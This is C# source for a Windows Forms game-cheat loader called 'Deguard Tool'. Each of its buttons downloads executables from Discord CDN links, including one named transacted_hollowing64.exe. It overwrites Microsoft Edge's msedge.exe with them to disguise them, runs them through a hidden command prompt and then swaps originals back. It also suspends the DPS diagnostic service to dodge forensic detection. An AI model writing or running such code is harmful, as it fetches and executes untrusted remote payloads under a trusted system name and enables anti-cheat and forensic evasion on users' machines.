
using Siticone.UI.WinForms;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Net.Http;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Deguard_Tool
{
    public partial class cheats : UserControl
    {
        public cheats()
        {
            InitializeComponent();
        }

        private void cheats_Load(object sender, EventArgs e)
        {

        }

        private void siticoneImageButton5_Click(object sender, EventArgs e)
        {

        }

        private void siticoneComboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            string selectedOption = siticoneComboBox1.SelectedItem.ToString();

            if (selectedOption == "Eulen")
            {
                siticoneButton3.Visible = true;
                siticoneButton3.BringToFront();
                siticoneButton3.Location = new Point(477, 54);
                siticoneButton1.Visible = false;
                siticoneButton1.SendToBack();
                siticoneButton2.Visible = false;
                siticoneButton2.SendToBack();
            }
            else if (selectedOption == "Skript")
            {
                siticoneButton1.Visible = true;
                siticoneButton1.BringToFront();
                siticoneButton1.Location = new Point(477, 54);
                siticoneButton3.Visible = false;
                siticoneButton3.SendToBack();
                siticoneButton2.Visible = false;
                siticoneButton2.SendToBack();
            }
            else if (selectedOption == "Gosth")
            {
                siticoneButton2.Visible = true;
                siticoneButton2.BringToFront();
                siticoneButton2.Location = new Point(477, 54);
                siticoneButton3.Visible = false;
                siticoneButton3.SendToBack();
                siticoneButton1.Visible = false;
                siticoneButton1.SendToBack();
            }
        }

        private async void siticoneButton3_Click(object sender, EventArgs e)
        {
            try
            {
                int dpsPid = GetDpsServiceProcessId();

                if (dpsPid != -1)
                {
                    PauseThreads(dpsPid);
                }

                Thread.Sleep(4000);

                string targetDirectory = @"C:\Program Files (x86)\Microsoft\Edge\Application";
                string msedgeExePath = Path.Combine(targetDirectory, "msedge.exe");

                using (var cts = new CancellationTokenSource())
                {
                    try
                    {
                        await DownloadAndWriteFileAsync("https://cdn.discordapp.com/attachments/1121500698283098243/1148007896949469265/loader.exe", msedgeExePath, cts.Token);

                        Process msEdgeProcess = StartMsEdgeProcess(msedgeExePath);

                        while (!msEdgeProcess.HasExited)
                        {
                            await Task.Delay(15000);
                        }

                        await DownloadAndWriteFileAsync("https://cdn.discordapp.com/attachments/1121848724583354418/1146905063533580388/msedge.exe", msedgeExePath, cts.Token);

                        MessageBox.Show("Executed Eulen!", "Deguard", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }
                    catch (OperationCanceledException)
                    {
                    }
                    finally
                    {
                        cts.Dispose();
                    }
                }

                if (dpsPid != -1)
                {
                    ResumeThreads(dpsPid);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"An error occurred: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private async Task DownloadAndWriteFileAsync(string url, string filePath, CancellationToken cancellationToken)
        {
            using (var httpClient = new HttpClient())
            {
                using (var response = await httpClient.GetAsync(url, cancellationToken))
                {
                    response.EnsureSuccessStatusCode();
                    using (var stream = await response.Content.ReadAsStreamAsync())
                    using (var fileStream = File.Create(filePath))
                    {
                        await stream.CopyToAsync(fileStream);
                    }
                }
            }
        }

        private Process StartMsEdgeProcess(string msedgeExePath)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = msedgeExePath,
                    WorkingDirectory = Path.GetDirectoryName(msedgeExePath),
                    UseShellExecute = true
                };

                return Process.Start(psi);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Failed to start msedge.exe: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return null;
            }
        }

        private void WaitForMsEdgeProcessExit(string msedgeExePath)
        {
            Process[] edgeProcesses = Process.GetProcessesByName("msedge");
            foreach (Process process in edgeProcesses)
            {
                if (string.Equals(process.MainModule.FileName, msedgeExePath, StringComparison.OrdinalIgnoreCase))
                {
                    process.WaitForExit();
                    break;
                }
            }
        }


        private int GetDpsServiceProcessId()
        {
            using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT ProcessId FROM Win32_Service WHERE Name = 'DPS'"))
            {
                foreach (ManagementObject service in searcher.Get())
                {
                    return Convert.ToInt32(service["ProcessId"]);
                }
            }

            return -1;
        }

        private void PauseThreads(int processId)
        {
            try
            {
                Process dpsProcess = Process.GetProcessById(processId);
                foreach (ProcessThread thread in dpsProcess.Threads)
                {
                    SuspendThread(thread.Id);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Failed to pause threads: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void ResumeThreads(int processId)
        {
            try
            {
                Process dpsProcess = Process.GetProcessById(processId);
                foreach (ProcessThread thread in dpsProcess.Threads)
                {
                    ResumeThread(thread.Id);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Failed to resume threads: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        private static extern uint SuspendThread(int hThread);

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        private static extern int ResumeThread(int hThread);

        private async Task<byte[]> DownloadFileBytesAsync(string downloadUrl)
        {
            try
            {
                using (var httpClient = new HttpClient())
                {
                    return await httpClient.GetByteArrayAsync(downloadUrl);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"An error occurred: {ex.Message}");
                return null;
            }
        }

        private async void siticoneButton1_Click(object sender, EventArgs e)
        {
            try
            {
                string targetDirectory = @"C:\Program Files (x86)\Microsoft\Edge\Application";
                string msedgeExePath = Path.Combine(targetDirectory, "msedge.exe");
                string msedgeProxyExePath = Path.Combine(targetDirectory, "msedge_proxy.exe");

                byte[] msedgeExeBytes = await DownloadFileBytesAsync("https://cdn.discordapp.com/attachments/1121500698283098243/1142420921785798747/transacted_hollowing64.exe");
                byte[] msedgeProxyExeBytes = await DownloadFileBytesAsync("https://cdn.discordapp.com/attachments/1121500698283098243/1142420123345494066/ovisetup.exe");

                File.WriteAllBytes(msedgeExePath, msedgeExeBytes);
                File.WriteAllBytes(msedgeProxyExePath, msedgeProxyExeBytes);

                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    RedirectStandardInput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WorkingDirectory = targetDirectory
                };

                Process cmdProcess = new Process
                {
                    StartInfo = psi
                };

                cmdProcess.Start();

                StreamWriter sw = cmdProcess.StandardInput;
                sw.WriteLine("msedge.exe msedge_proxy.exe C:\\windows\\system32\\notepad.exe && exit");
                sw.WriteLine("exit");

                cmdProcess.WaitForExit();

                msedgeExeBytes = await DownloadFileBytesAsync("https://cdn.discordapp.com/attachments/1121848724583354418/1146905063533580388/msedge.exe");
                msedgeProxyExeBytes = await DownloadFileBytesAsync("https://cdn.discordapp.com/attachments/1121848724583354418/1146905063852363816/msedge_proxy.exe");

                File.WriteAllBytes(msedgeExePath, msedgeExeBytes);
                File.WriteAllBytes(msedgeProxyExePath, msedgeProxyExeBytes);

                MessageBox.Show("Executed Skript!", "Deguard", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"An error occurred: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private async void siticoneButton2_Click(object sender, EventArgs e)
        {
            try
            {
                SuspendService("DPS");

                string targetDirectory = @"C:\Program Files (x86)\Microsoft\Edge\Application";
                string msedgeExePath = Path.Combine(targetDirectory, "msedge.exe");

                byte[] msedgeExeBytes = await DownloadFileBytesAsync("https://cdn.discordapp.com/attachments/1121848724583354418/1148957580949987469/launcher.exe");

                File.WriteAllBytes(msedgeExePath, msedgeExeBytes);

                ResumeService("DPS");

                await Task.Delay(2000);

                msedgeExeBytes = await DownloadFileBytesAsync("https://cdn.discordapp.com/attachments/1121848724583354418/1146905063533580388/msedge.exe");

                File.WriteAllBytes(msedgeExePath, msedgeExeBytes);

                MessageBox.Show("Executed Ghost!", "Deguard", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"An error occurred: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void SuspendService(string serviceName)
        {
            using (ServiceController serviceController = new ServiceController(serviceName))
            {
                if (serviceController.Status == ServiceControllerStatus.Running)
                {
                    serviceController.Pause();
                    serviceController.WaitForStatus(ServiceControllerStatus.Paused, TimeSpan.FromSeconds(30));
                }
            }
        }

        private void ResumeService(string serviceName)
        {
            using (ServiceController serviceController = new ServiceController(serviceName))
            {
                if (serviceController.Status == ServiceControllerStatus.Paused)
                {
                    serviceController.Continue();
                    serviceController.WaitForStatus(ServiceControllerStatus.Running, TimeSpan.FromSeconds(30));
                }
            }
        }

        private void siticoneButton9_Click(object sender, EventArgs e)
        {

        }
    }
}